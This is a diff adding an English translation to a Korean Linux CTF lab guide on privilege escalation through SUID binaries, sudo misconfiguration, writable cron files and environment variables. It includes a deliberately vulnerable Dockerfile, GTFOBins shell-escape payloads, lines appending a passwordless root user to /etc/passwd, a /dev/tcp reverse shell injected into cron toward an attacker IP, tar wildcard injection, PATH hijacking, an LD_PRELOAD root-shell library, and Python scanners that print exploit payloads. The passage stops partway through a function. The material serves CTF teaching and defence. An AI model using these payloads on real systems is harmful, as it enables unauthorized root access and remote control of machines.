@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 리눅스 CTF 실습 랩 — 권한상승·SUID·Cron·환경변수 종합
 
 ## 1. 실습 환경
@@ -1349,5 +1355,1354 @@ env | sort
 history | grep -i "pass\|secret\|key\|token"
 
 # 설정 파일에서 비밀번호 탐색
+grep -r "password" /etc/ 2>/dev/null | grep -v Binary
+```
+
+---
+
+<a name="english"></a>
+
+# Linux CTF Practical Lab — Privilege Escalation · SUID · Cron · Environment Variables
+
+## 1. Lab Environment
+
+### 1.1 Docker-Based Vulnerable Environment Setup
+
+```bash
+# Vulnerable lab Dockerfile
+FROM ubuntu:22.04
+
+RUN apt-get update && apt-get install -y \
+    gcc \
+    sudo \
+    cron \
+    python3 \
+    python3-pip \
+    vim \
+    net-tools \
+    find \
+    && rm -rf /var/lib/apt/lists/*
+
+# Create vulnerable user accounts
+RUN useradd -m -s /bin/bash ctfuser && \
+    useradd -m -s /bin/bash developer && \
+    echo "ctfuser:ctfpass" | chpasswd && \
+    echo "developer:devpass" | chpasswd
+
+# Create vulnerable SUID binary
+COPY vuln_suid.c /tmp/
+RUN gcc -o /usr/local/bin/vuln_suid /tmp/vuln_suid.c && \
+    chmod 4755 /usr/local/bin/vuln_suid
+
+# Vulnerable sudo configuration
+RUN echo "ctfuser ALL=(root) NOPASSWD: /usr/bin/find" >> /etc/sudoers
+
+# Vulnerable Cron configuration
+RUN chmod 777 /etc/cron.d/
+RUN echo "* * * * * root /opt/backup.sh" > /etc/cron.d/backup && \
+    chmod 777 /opt/backup.sh
+
+WORKDIR /home/ctfuser
+USER ctfuser
+```
+
+```bash
+# Build and run container
+docker build -t linux-ctf-lab .
+docker run -it --name ctf-env linux-ctf-lab /bin/bash
+
+# Or use an existing vulnerable image
+docker run -it --rm \
+    --cap-add=SYS_PTRACE \
+    --security-opt seccomp=unconfined \
+    ubuntu:20.04 /bin/bash
+```
+
+### 1.2 Privilege Escalation Vector Classification
+
+| Vector Type | Detection Command | Severity | Success Rate |
+|-------------|------------------|----------|-------------|
+| SUID binary abuse | `find / -perm -4000 2>/dev/null` | High | Very High |
+| sudo misconfiguration | `sudo -l` | High | High |
+| Cron file write permission | `ls -la /etc/cron*` | Medium | High |
+| Environment variable PATH hijacking | `echo $PATH; strings <binary>` | Medium | Medium |
+| Kernel exploit | `uname -a; searchsploit` | Critical | Low |
+| Writable /etc/passwd | `ls -la /etc/passwd` | Critical | Very High |
+| NFS no_root_squash | `cat /etc/exports` | High | High |
+| Writable service files | `find / -name "*.service" -writable` | High | Medium |
+| Capabilities abuse | `getcap -r / 2>/dev/null` | High | High |
+| Docker socket access | `ls -la /var/run/docker.sock` | Critical | Very High |
+
+### 1.3 Initial Enumeration Checklist
+
+```bash
+# System basic info
+id && whoami
+uname -a
+cat /etc/os-release
+hostname
+
+# Network info
+ip addr
+netstat -tulnp 2>/dev/null || ss -tulnp
+cat /etc/hosts
+
+# User info
+cat /etc/passwd | grep -v nologin
+cat /etc/group
+last
+w
+
+# Running processes
+ps aux
+ps auxf
+
+# Environment variables
+env
+printenv
+```
+
+---
+
+## 2. CTF Challenge 1: SUID Binary Abuse
+
+### 2.1 SUID File Discovery
+
+```bash
+# Basic SUID search
+find / -perm -4000 -type f 2>/dev/null
+
+# Detailed search (including owner)
+find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
+
+# Include SGID
+find / -perm /6000 -type f 2>/dev/null
+
+# Filter only root-owned SUID
+find / -user root -perm -4000 -type f 2>/dev/null
+
+# Example output
+# -rwsr-xr-x 1 root root 44784 /usr/bin/passwd
+# -rwsr-xr-x 1 root root 55528 /usr/bin/mount
+# -rwsr-xr-x 1 root root 31032 /usr/local/bin/vuln_suid  <-- suspicious
+```
+
+### 2.2 GTFOBins Strategy Table
+
+| Binary | SUID Exploit Method | Command Example |
+|--------|--------------------|----|
+| `find` | Shell via -exec flag | `find . -exec /bin/sh -p \; -quit` |
+| `vim` | Execute shell command | `vim -c ':!/bin/sh'` |
+| `python3` | Shell after os.setuid | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
+| `perl` | Using POSIX module | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'` |
+| `bash` | -p flag | `bash -p` |
+| `cp` | Overwrite /etc/passwd | `cp /tmp/malicious_passwd /etc/passwd` |
+| `tee` | File write | `echo "root2::0:0:root:/root:/bin/bash" | tee -a /etc/passwd` |
+| `less` | Shell escape | `less /etc/passwd` → `!sh` |
+| `awk` | BEGIN block | `awk 'BEGIN {system("/bin/sh")}'` |
+| `nmap` | Interactive mode | `nmap --interactive` → `!sh` |
+| `env` | Environment execution | `env /bin/sh -p` |
+| `strace` | Command trace wrapping | `strace -o /dev/null /bin/sh -p` |
+
+### 2.3 Python CLI: SUID Binary Analyzer
+
+```python
+#!/usr/bin/env python3
+"""SUID binary analyzer — cross-references with GTFOBins DB to suggest exploit paths."""
+
+import argparse
+import json
+import os
+import stat
+import subprocess
+import sys
+from dataclasses import dataclass, field
+from pathlib import Path
+
+
+@dataclass
+class SuidBinary:
+    path: str
+    owner: str
+    permissions: str
+    size: int
+    gtfobins_entry: dict | None = None
+
+
+@dataclass
+class AnalysisResult:
+    total_found: int
+    exploitable: list[SuidBinary] = field(default_factory=list)
+    unknown: list[SuidBinary] = field(default_factory=list)
+    errors: list[str] = field(default_factory=list)
+
+
+def find_suid_binaries(search_path: str) -> list[str]:
+    """Return list of files with SUID bit set under the given path."""
+    result = subprocess.run(
+        ["find", search_path, "-perm", "-4000", "-type", "f"],
+        capture_output=True,
+        text=True,
+        timeout=60,
+    )
+    paths = [p.strip() for p in result.stdout.splitlines() if p.strip()]
+    return paths
+
+
+def get_file_info(filepath: str) -> SuidBinary | None:
+    """Return file stat info as a SuidBinary object."""
+    try:
+        st = os.stat(filepath)
+        perms = oct(st.st_mode)[-4:]
+        owner = subprocess.run(
+            ["stat", "-c", "%U", filepath],
+            capture_output=True,
+            text=True,
+        ).stdout.strip()
+        return SuidBinary(
+            path=filepath,
+            owner=owner,
+            permissions=perms,
+            size=st.st_size,
+        )
+    except (OSError, PermissionError) as e:
+        return None
+
+
+def load_gtfobins_db(db_path: str) -> dict:
+    """Load GTFOBins JSON DB. Returns built-in default DB if file not found."""
+    if db_path and Path(db_path).exists():
+        with open(db_path, encoding="utf-8") as f:
+            return json.load(f)
+
+    # Built-in default DB (core binaries)
+    return {
+        "find": {
+            "suid": "find . -exec /bin/sh -p \\; -quit",
+            "description": "Execute shell preserving SUID privileges via -exec flag",
+        },
+        "vim": {
+            "suid": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+            "description": "Obtain SUID shell via Python plugin",
+        },
+        "python3": {
+            "suid": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+            "description": "Call setuid(0) then execute shell",
+        },
+        "python": {
+            "suid": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+            "description": "Call setuid(0) then execute shell",
+        },
+        "perl": {
+            "suid": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
+            "description": "Execute shell after POSIX setuid",
+        },
+        "bash": {
+            "suid": "bash -p",
+            "description": "Maintain effective UID with -p flag",
+        },
+        "sh": {
+            "suid": "sh -p",
+            "description": "Maintain effective UID with -p flag",
+        },
+        "cp": {
+            "suid": "cp /etc/passwd /tmp/passwd.bak && echo 'pwned::0:0::/root:/bin/sh' >> /etc/passwd",
+            "description": "Exploit write access to /etc/passwd",
+        },
+        "tee": {
+            "suid": "echo 'pwned::0:0::/root:/bin/sh' | tee -a /etc/passwd",
+            "description": "Append to /etc/passwd via tee",
+        },
+        "awk": {
+            "suid": "awk 'BEGIN {system(\"/bin/sh\")}'",
+            "description": "Execute shell in BEGIN block",
+        },
+        "less": {
+            "suid": "less /etc/passwd  # then type !sh",
+            "description": "Shell escape from within less",
+        },
+        "more": {
+            "suid": "more /etc/passwd  # then type !sh",
+            "description": "Shell escape from within more",
+        },
+        "nmap": {
+            "suid": "nmap --interactive  # then type !sh",
+            "description": "Shell escape via nmap interactive mode",
+        },
+        "env": {
+            "suid": "env /bin/sh -p",
+            "description": "Execute shell with -p flag via env",
+        },
+        "strace": {
+            "suid": "strace -o /dev/null /bin/sh -p",
+            "description": "SUID shell via strace wrapping",
+        },
+    }
+
+
+def analyze(
+    search_path: str,
+    gtfobins_db_path: str,
+    output_path: str | None,
+) -> AnalysisResult:
+    """Main SUID binary analysis logic."""
+    db = load_gtfobins_db(gtfobins_db_path)
+    suid_paths = find_suid_binaries(search_path)
+    result = AnalysisResult(total_found=len(suid_paths))
+
+    for filepath in suid_paths:
+        binary = get_file_info(filepath)
+        if binary is None:
+            result.errors.append(f"Access failed: {filepath}")
+            continue
+
+        binary_name = Path(filepath).name
+        if binary_name in db:
+            binary.gtfobins_entry = db[binary_name]
+            result.exploitable.append(binary)
+        else:
+            result.unknown.append(binary)
+
+    return result
+
+
+def format_report(result: AnalysisResult) -> str:
+    """Format analysis results in a human-readable form."""
+    lines: list[str] = []
+    lines.append("=" * 60)
+    lines.append("SUID Binary Analysis Results")
+    lines.append("=" * 60)
+    lines.append(f"Total SUID files found: {result.total_found}")
+    lines.append(f"Exploitable: {len(result.exploitable)}")
+    lines.append(f"Not in DB (manual analysis needed): {len(result.unknown)}")
+    lines.append("")
+
+    if result.exploitable:
+        lines.append("[!] Exploitable SUID Binaries")
+        lines.append("-" * 40)
+        for b in result.exploitable:
+            lines.append(f"  File: {b.path}")
+            lines.append(f"  Owner: {b.owner} | Permissions: {b.permissions} | Size: {b.size}B")
+            if b.gtfobins_entry:
+                lines.append(f"  Description: {b.gtfobins_entry['description']}")
+                lines.append(f"  Exploit: {b.gtfobins_entry['suid']}")
+            lines.append("")
+
+    if result.unknown:
+        lines.append("[?] Binaries Requiring Manual Analysis")
+        lines.append("-" * 40)
+        for b in result.unknown:
+            lines.append(f"  File: {b.path} (Owner: {b.owner})")
+        lines.append("")
+
+    if result.errors:
+        lines.append("[x] Errors")
+        for err in result.errors:
+            lines.append(f"  {err}")
+
+    return "\n".join(lines)
+
+
+def parse_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        description="SUID binary analyzer — cross-reference with GTFOBins DB",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s --path /
+  %(prog)s --path /usr --gtfobins-db /opt/gtfobins.json
+  %(prog)s --path / --output /tmp/suid_report.txt
+        """,
+    )
+    parser.add_argument(
+        "--path",
+        default="/",
+        help="Starting path for SUID search (default: /)",
+    )
+    parser.add_argument(
+        "--gtfobins-db",
+        default="",
+        help="GTFOBins JSON DB file path (uses built-in DB if not specified)",
+    )
+    parser.add_argument(
+        "--output",
+        default="",
+        help="Output file path (prints to stdout if not specified)",
+    )
+    return parser.parse_args()
+
+
+def main() -> None:
+    args = parse_args()
+
+    print(f"[*] Search path: {args.path}")
+    print("[*] Collecting SUID binaries...")
+
+    result = analyze(
+        search_path=args.path,
+        gtfobins_db_path=args.gtfobins_db,
+        output_path=args.output,
+    )
+
+    report = format_report(result)
+
+    if args.output:
+        Path(args.output).write_text(report, encoding="utf-8")
+        print(f"[+] Report saved: {args.output}")
+    else:
+        print(report)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 3. CTF Challenge 2: sudo Misconfiguration Exploit
+
+### 3.1 sudo -l Analysis and Privilege Escalation Paths
+
+```bash
+# Check sudo privileges
+sudo -l
+
+# Example output
+# User ctfuser may run the following commands on target:
+#     (root) NOPASSWD: /usr/bin/find
+#     (root) NOPASSWD: /usr/bin/less
+#     (ALL : ALL) /usr/bin/apt-get
+#     (root) /usr/bin/vim /var/log/syslog
+
+# Directly check sudoers file (if permissions allow)
+cat /etc/sudoers
+ls /etc/sudoers.d/
+```
+
+### 3.2 NOPASSWD Abuse Scenarios
+
+```bash
+# Scenario 1: find NOPASSWD
+sudo find /etc/passwd -exec /bin/sh \;
+
+# Scenario 2: vim allowed to edit specific file → shell escape
+sudo vim /var/log/syslog
+# Inside vim: :!/bin/bash
+
+# Scenario 3: apt-get allowed
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+# Scenario 4: less allowed
+sudo less /etc/passwd
+# Inside less: !sh
+
+# Scenario 5: Wildcard exploitation
+# sudoers: (root) NOPASSWD: /opt/scripts/*.sh
+# Abuse:
+echo '#!/bin/bash\n/bin/bash -i' > /opt/scripts/evil.sh
+chmod +x /opt/scripts/evil.sh
+sudo /opt/scripts/evil.sh
+```
+
+### 3.3 Python CLI: sudo Privilege Analyzer
+
+```python
+#!/usr/bin/env python3
+"""sudo privilege analyzer — parse sudoers file and suggest exploit paths."""
+
+import argparse
+import re
+import subprocess
+from dataclasses import dataclass, field
+from pathlib import Path
+
+
+@dataclass
+class SudoRule:
+    user: str
+    run_as: str
+    nopasswd: bool
+    commands: list[str]
+    raw: str
+
+
+@dataclass
+class ExploitPath:
+    command: str
+    method: str
+    payload: str
+    severity: str
+
+
+# Built-in GTFOBins sudo exploit DB
+SUDO_EXPLOITS: dict[str, ExploitPath] = {
+    "find": ExploitPath(
+        command="find",
+        method="exec flag",
+        payload="sudo find /tmp -exec /bin/bash \\; -quit",
+        severity="critical",
+    ),
+    "vim": ExploitPath(
+        command="vim",
+        method="internal shell",
+        payload="sudo vim -c ':!/bin/bash'",
+        severity="critical",
+    ),
+    "less": ExploitPath(
+        command="less",
+        method="shell escape",
+        payload="sudo less /etc/passwd  # then !bash",
+        severity="high",
+    ),
+    "awk": ExploitPath(
+        command="awk",
+        method="BEGIN execution",
+        payload="sudo awk 'BEGIN {system(\"/bin/bash\")}'",
+        severity="critical",
+    ),
+    "python3": ExploitPath(
+        command="python3",
+        method="os.system",
+        payload="sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
+        severity="critical",
+    ),
+    "python": ExploitPath(
+        command="python",
+        method="os.system",
+        payload="sudo python -c 'import os; os.system(\"/bin/bash\")'",
+        severity="critical",
+    ),
+    "perl": ExploitPath(
+        command="perl",
+        method="exec",
+        payload="sudo perl -e 'exec \"/bin/bash\"'",
+        severity="critical",
+    ),
+    "ruby": ExploitPath(
+        command="ruby",
+        method="exec",
+        payload="sudo ruby -e 'exec \"/bin/bash\"'",
+        severity="critical",
+    ),
+    "php": ExploitPath(
+        command="php",
+        method="system",
+        payload="sudo php -r 'system(\"/bin/bash\");'",
+        severity="critical",
+    ),
+    "nmap": ExploitPath(
+        command="nmap",
+        method="interactive",
+        payload="sudo nmap --interactive  # !bash",
+        severity="high",
+    ),
+    "apt-get": ExploitPath(
+        command="apt-get",
+        method="Pre-Invoke",
+        payload="sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash",
+        severity="critical",
+    ),
+    "cp": ExploitPath(
+        command="cp",
+        method="overwrite /etc/passwd",
+        payload="echo 'root2::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd",
+        severity="critical",
+    ),
+}
+
+
+def get_sudo_rules_from_command(user: str) -> list[str]:
+    """Get sudo rules for the current user via sudo -l."""
+    try:
+        result = subprocess.run(
+            ["sudo", "-l", "-U", user],
+            capture_output=True,
+            text=True,
+            timeout=10,
+        )
+        return result.stdout.splitlines()
+    except (subprocess.TimeoutExpired, FileNotFoundError):
+        return []
+
+
+def parse_sudoers_file(filepath: str) -> list[SudoRule]:
+    """Parse sudoers file and return a list of SudoRule objects."""
+    rules: list[SudoRule] = []
+    if not Path(filepath).exists():
+        return rules
+
+    content = Path(filepath).read_text(encoding="utf-8", errors="ignore")
+    for line in content.splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+
+        # Basic sudoers rule pattern: user host=(run_as) [NOPASSWD:] commands
+        match = re.match(
+            r"^(\w+)\s+\S+\s*=\s*\((.+?)\)\s*(NOPASSWD:\s*)?(.+)$",
+            line,
+        )
+        if match:
+            user, run_as, nopasswd_str, cmds_str = match.groups()
+            commands = [c.strip() for c in cmds_str.split(",")]
+            rules.append(
+                SudoRule(
+                    user=user,
+                    run_as=run_as.strip(),
+                    nopasswd=bool(nopasswd_str),
+                    commands=commands,
+                    raw=line,
+                )
+            )
+
+    return rules
+
+
+def find_exploit_paths(rules: list[SudoRule]) -> list[tuple[SudoRule, ExploitPath]]:
+    """Search for exploitable paths in sudo rules."""
+    findings: list[tuple[SudoRule, ExploitPath]] = []
+
+    for rule in rules:
+        for cmd in rule.commands:
+            binary_name = Path(cmd.split()[0]).name
+            if binary_name in SUDO_EXPLOITS:
+                findings.append((rule, SUDO_EXPLOITS[binary_name]))
+
+    return findings
+
+
+def parse_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        description="sudo privilege analyzer — parse sudoers file and suggest exploit paths",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s --sudoers-file /etc/sudoers
+  %(prog)s --user ctfuser
+  %(prog)s --sudoers-file /etc/sudoers --user developer
+        """,
+    )
+    parser.add_argument(
+        "--sudoers-file",
+        default="",
+        help="Path to sudoers file to analyze",
+    )
+    parser.add_argument(
+        "--user",
+        default="",
+        help="Username to analyze (queries current rules via sudo -l)",
+    )
+    return parser.parse_args()
+
+
+def main() -> None:
+    args = parse_args()
+
+    if not args.sudoers_file and not args.user:
+        print("[-] Either --sudoers-file or --user is required.")
+        raise SystemExit(1)
+
+    rules: list[SudoRule] = []
+
+    if args.sudoers_file:
+        print(f"[*] Analyzing sudoers file: {args.sudoers_file}")
+        rules = parse_sudoers_file(args.sudoers_file)
+        print(f"[*] Found {len(rules)} rules")
+
+    if args.user:
+        print(f"[*] Querying sudo privileges for user '{args.user}'...")
+        lines = get_sudo_rules_from_command(args.user)
+        for line in lines:
+            print(f"    {line}")
+
+    findings = find_exploit_paths(rules)
+
+    print("\n" + "=" * 60)
+    print("Exploit Path Analysis Results")
+    print("=" * 60)
+
+    if not findings:
+        print("[*] No immediately exploitable paths found.")
+        print("[*] Manually check for ALL, NOPASSWD combinations, etc.")
+        return
+
+    for rule, exploit in findings:
+        print(f"\n[!] Dangerous rule found!")
+        print(f"    User: {rule.user} → {rule.run_as}")
+        print(f"    NOPASSWD: {'Yes' if rule.nopasswd else 'No'}")
+        print(f"    Vulnerable command: {exploit.command}")
+        print(f"    Method: {exploit.method}")
+        print(f"    Severity: {exploit.severity.upper()}")
+        print(f"    Payload: {exploit.payload}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 4. CTF Challenge 3: Writable Cron File Abuse
+
+### 4.1 Searching for /etc/cron* Write Permissions
+
+```bash
+# Check permissions on cron-related files/directories
+ls -la /etc/cron*
+ls -la /var/spool/cron/
+ls -la /var/spool/cron/crontabs/
+
+# Search for writable cron files
+find /etc/cron* -writable 2>/dev/null
+find /var/spool/cron -writable 2>/dev/null
+
+# Check running cron jobs
+cat /etc/crontab
+crontab -l
+
+# Search for world-writable cron scripts
+find /etc/cron.d/ -perm -o+w 2>/dev/null
+find /etc/cron.daily/ -perm -o+w 2>/dev/null
+find /etc/cron.weekly/ -perm -o+w 2>/dev/null
+
+# Check for wildcard vulnerabilities
+cat /etc/crontab | grep "\*"
+```
+
+### 4.2 Reverse Shell Injection Procedure
+
+```bash
+# Step 1: Verify writable cron script
+ls -la /etc/cron.d/backup  # check write permission
+
+# Step 2: Prepare reverse shell payload (attacker IP: 10.10.10.100)
+ATTACKER_IP="10.10.10.100"
+ATTACKER_PORT="4444"
+
+# Step 3: Append reverse shell to cron script
+echo "bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1" >> /opt/backup.sh
+
+# Or add directly to cron.d file
+echo "* * * * * root bash -i >& /dev/tcp/10.10.10.100/4444 0>&1" > /etc/cron.d/evil
+
+# Step 4: Start listener on attacker server
+nc -lvnp 4444
+
+# Wildcard exploit (tar command abuse)
+# crontab: * * * * * root tar czf /backup.tar.gz /data/*
+cd /data
+echo "" > '--checkpoint=1'
+echo "" > '--checkpoint-action=exec=bash evil.sh'
+echo '#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.100/4444 0>&1' > evil.sh
+```
+
+### 4.3 Python CLI: Cron Vulnerability Scanner
+
+```python
+#!/usr/bin/env python3
+"""Cron vulnerability scanner — detect write permissions, world-readable files, and wildcard injection."""
+
+import argparse
+import os
+import re
+import stat
+from dataclasses import dataclass, field
+from pathlib import Path
+
+
+@dataclass
+class CronVulnerability:
+    vuln_type: str
+    path: str
+    detail: str
+    severity: str
+    recommendation: str
+
+
+@dataclass
+class ScanResult:
+    scan_path: str
+    check_type: str
+    vulnerabilities: list[CronVulnerability] = field(default_factory=list)
+    scanned_files: int = 0
+
+
+CRON_PATHS = [
+    "/etc/crontab",
+    "/etc/cron.d",
+    "/etc/cron.daily",
+    "/etc/cron.weekly",
+    "/etc/cron.monthly",
+    "/etc/cron.hourly",
+    "/var/spool/cron",
+    "/var/spool/cron/crontabs",
+]
+
+
+def check_writable(path: str) -> list[CronVulnerability]:
+    """Detect writable cron files/directories."""
+    vulns: list[CronVulnerability] = []
+    scan_target = Path(path)
+
+    targets: list[Path] = []
+    if scan_target.is_dir():
+        targets = list(scan_target.rglob("*"))
+        targets.append(scan_target)
+    elif scan_target.is_file():
+        targets = [scan_target]
+    else:
+        for cp in CRON_PATHS:
+            p = Path(cp)
+            if p.exists():
+                if p.is_dir():
+                    targets.extend(p.rglob("*"))
+                targets.append(p)
+
+    for target in targets:
+        try:
+            file_stat = target.stat()
+            mode = file_stat.st_mode
+
+            # World-writable (o+w)
+            if mode & stat.S_IWOTH:
+                vulns.append(
+                    CronVulnerability(
+                        vuln_type="world-writable",
+                        path=str(target),
+                        detail=f"Permissions: {oct(mode)[-4:]} — writable by anyone",
+                        severity="critical",
+                        recommendation="Remove write permission with chmod o-w",
+                    )
+                )
+            # Group-writable (g+w)
+            elif mode & stat.S_IWGRP:
+                vulns.append(
+                    CronVulnerability(
+                        vuln_type="group-writable",
+                        path=str(target),
+                        detail=f"Permissions: {oct(mode)[-4:]} — group writable",
+                        severity="high",
+                        recommendation="Remove group write permission with chmod g-w",
+                    )
+                )
+        except (PermissionError, OSError):
+            pass
+
+    return vulns
+
+
+def check_world_readable(path: str) -> list[CronVulnerability]:
+    """Detect world-readable cron files (risk of sensitive information exposure)."""
+    vulns: list[CronVulnerability] = []
+    targets: list[Path] = []
+
+    scan_target = Path(path)
+    if scan_target.is_dir():
+        targets = list(scan_target.rglob("*"))
+    elif scan_target.is_file():
+        targets = [scan_target]
+
+    for target in targets:
+        if not target.is_file():
+            continue
+        try:
+            file_stat = target.stat()
+            mode = file_stat.st_mode
+            if mode & stat.S_IROTH:
+                content = target.read_text(encoding="utf-8", errors="ignore")
+                has_sensitive = any(
+                    kw in content.lower()
+                    for kw in ["password", "passwd", "secret", "token", "key"]
+                )
+                severity = "high" if has_sensitive else "low"
+                vulns.append(
+                    CronVulnerability(
+                        vuln_type="world-readable",
+                        path=str(target),
+                        detail=f"Permissions: {oct(mode)[-4:]} | Sensitive data: {'found' if has_sensitive else 'none'}",
+                        severity=severity,
+                        recommendation="Remove others read permission with chmod o-r",
+                    )
+                )
+        except (PermissionError, OSError):
+            pass
+
+    return vulns
+
+
+def check_wildcard(path: str) -> list[CronVulnerability]:
+    """Detect cron commands vulnerable to wildcard injection."""
+    vulns: list[CronVulnerability] = []
+    dangerous_cmds = re.compile(
+        r"(tar|rsync|chown|chmod|find|rm)\s+.*\*",
+        re.IGNORECASE,
+    )
+
+    targets: list[Path] = []
+    scan_target = Path(path)
+    if scan_target.is_dir():
+        targets = list(scan_target.rglob("*"))
+    elif scan_target.is_file():
+        targets = [scan_target]
+    else:
+        for cp in CRON_PATHS:
+            p = Path(cp)
+            if p.is_file():
+                targets.append(p)
+            elif p.is_dir():
+                targets.extend(p.rglob("*"))
+
+    for target in targets:
+        if not target.is_file():
+            continue
+        try:
+            content = target.read_text(encoding="utf-8", errors="ignore")
+            for lineno, line in enumerate(content.splitlines(), 1):
+                match = dangerous_cmds.search(line)
+                if match:
+                    cmd = match.group(1)
+                    vulns.append(
+                        CronVulnerability(
+                            vuln_type="wildcard-injection",
+                            path=f"{target}:{lineno}",
+                            detail=f"Dangerous command: {cmd} + wildcard → filename injection possible\n    Line: {line.strip()}",
+                            severity="high",
+                            recommendation=f"Use absolute paths or explicit file lists when calling {cmd}",
+                        )
+                    )
+        except (PermissionError, OSError):
+            pass
+
+    return vulns
+
+
+def parse_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        description="Cron vulnerability scanner — detect write permissions, world-readable files, and wildcard injection",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s --check writable
+  %(prog)s --scan-path /etc/cron.d --check writable
+  %(prog)s --scan-path /etc/crontab --check wildcard
+  %(prog)s --check all
+        """,
+    )
+    parser.add_argument(
+        "--scan-path",
+        default="",
+        help="Path to scan (scans all standard cron paths if not specified)",
+    )
+    parser.add_argument(
+        "--check",
+        choices=["writable", "world-readable", "wildcard", "all"],
+        default="all",
+        help="Check type to perform (default: all)",
+    )
+    return parser.parse_args()
+
+
+def main() -> None:
+    args = parse_args()
+    scan_path = args.scan_path or "/"
+
+    all_vulns: list[CronVulnerability] = []
+
+    if args.check in ("writable", "all"):
+        print("[*] Checking for write permission vulnerabilities...")
+        all_vulns.extend(check_writable(scan_path))
+
+    if args.check in ("world-readable", "all"):
+        print("[*] Checking for world-readable vulnerabilities...")
+        all_vulns.extend(check_world_readable(scan_path))
+
+    if args.check in ("wildcard", "all"):
+        print("[*] Checking for wildcard injection vulnerabilities...")
+        all_vulns.extend(check_wildcard(scan_path))
+
+    print("\n" + "=" * 60)
+    print(f"Cron Vulnerability Scan Results — {len(all_vulns)} found")
+    print("=" * 60)
+
+    for vuln in sorted(all_vulns, key=lambda v: v.severity):
+        print(f"\n[{vuln.severity.upper()}] {vuln.vuln_type}")
+        print(f"  Path: {vuln.path}")
+        print(f"  Detail: {vuln.detail}")
+        print(f"  Recommendation: {vuln.recommendation}")
+
+    if not all_vulns:
+        print("[+] No vulnerabilities found.")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 5. CTF Challenge 4: Environment Variable PATH Hijacking
+
+### 5.1 Detecting Relative Path Execution Vulnerabilities
+
+```bash
+# Check for relative path command calls in binary
+strings /usr/local/bin/vuln_binary | grep -v "/"
+# Example output: service, ps, id, ls — commands called without absolute paths
+
+# Trace execution with ltrace
+ltrace /usr/local/bin/vuln_binary 2>&1 | grep exec
+
+# Check system calls with strace
+strace -e trace=execve /usr/local/bin/vuln_binary 2>&1
+
+# Check PATH environment variable
+echo $PATH
+
+# PATH hijacking exploit
+mkdir /tmp/hijack
+echo '#!/bin/bash' > /tmp/hijack/service
+echo '/bin/bash -p' >> /tmp/hijack/service
+chmod +x /tmp/hijack/service
+
+# Prepend to PATH
+export PATH=/tmp/hijack:$PATH
+/usr/local/bin/vuln_binary  # → obtain root shell
+```
+
+### 5.2 LD_PRELOAD Abuse Technique
+
+```c
+/* evil_lib.c — malicious library to be loaded via LD_PRELOAD */
+#include <stdio.h>
+#include <unistd.h>
+
+void __attribute__((constructor)) evil_init() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -p");
+}
+```
+
+```bash
+# Compile
+gcc -shared -fPIC -o /tmp/evil.so evil_lib.c
+
+# Check if sudo allows LD_PRELOAD
+# Works if env_keep += LD_PRELOAD is configured
+
+# Abuse LD_PRELOAD with sudo
+sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find
+
+# LD_PRELOAD is ignored for SUID binaries (security feature)
+# However, it works if sudo's env_keep is configured
+```
+
+### 5.3 Python CLI: Environment Variable Vulnerability Detector
+
+```python
+#!/usr/bin/env python3
+"""Environment variable vulnerability detector — analyze PATH hijacking and LD_PRELOAD abuse paths."""
+
+import argparse
+import os
+import re
+import subprocess
+from dataclasses import dataclass, field
+from pathlib import Path
+
+
+@dataclass
+class EnvVulnerability:
+    vuln_type: str
+    detail: str
+    severity: str
+    exploit_example: str
+
+
+@dataclass
+class BinaryAnalysis:
+    binary_path: str
+    relative_commands: list[str] = field(default_factory=list)
+    ld_preload_vulnerable: bool = False
+    vulnerabilities: list[EnvVulnerability] = field(default_factory=list)
+
+
+def extract_relative_commands(binary_path: str) -> list[str]:
+    """Extract relative path commands from binary using strings."""
+    try:
+        result = subprocess.run(
+            ["strings", binary_path],
+            capture_output=True,
+            text=True,
+            timeout=10,
+        )
+    except FileNotFoundError:
+        try:
+            with open(binary_path, "rb") as f:
+                content = f.read()
+            printable = re.findall(rb"[\x20-\x7e]{4,}", content)
+            result_strings = [s.decode() for s in printable]
+        except (OSError, PermissionError):
+            return []
+    else:
+        result_strings = result.stdout.splitlines()
+
+    known_commands = {
+        "ls", "ps", "id", "whoami", "cat", "grep", "find",
+        "service", "systemctl", "python", "python3", "perl",
+        "awk", "sed", "curl", "wget", "nc", "netcat", "bash", "sh",
+    }
+
+    found: list[str] = []
+    for s in result_strings:
+        s = s.strip()
+        if s in known_commands:
+            found.append(s)
+
+    return list(set(found))
+
+
+def check_ld_preload_vulnerability(binary_path: str) -> bool:
+    """Returns False for SUID binaries since LD_PRELOAD is ignored for them."""
+    try:
+        file_stat = os.stat(binary_path)
+        import stat
+        is_suid = bool(file_stat.st_mode & stat.S_ISUID)
+        return not is_suid
+    except OSError:
+        return False
+
+
+def parse_env_file(env_file: str) -> dict[str, str]:
+    """Parse environment variable file (key=value format)."""
+    env: dict[str, str] = {}
+    if not env_file or not Path(env_file).exists():
+        return env
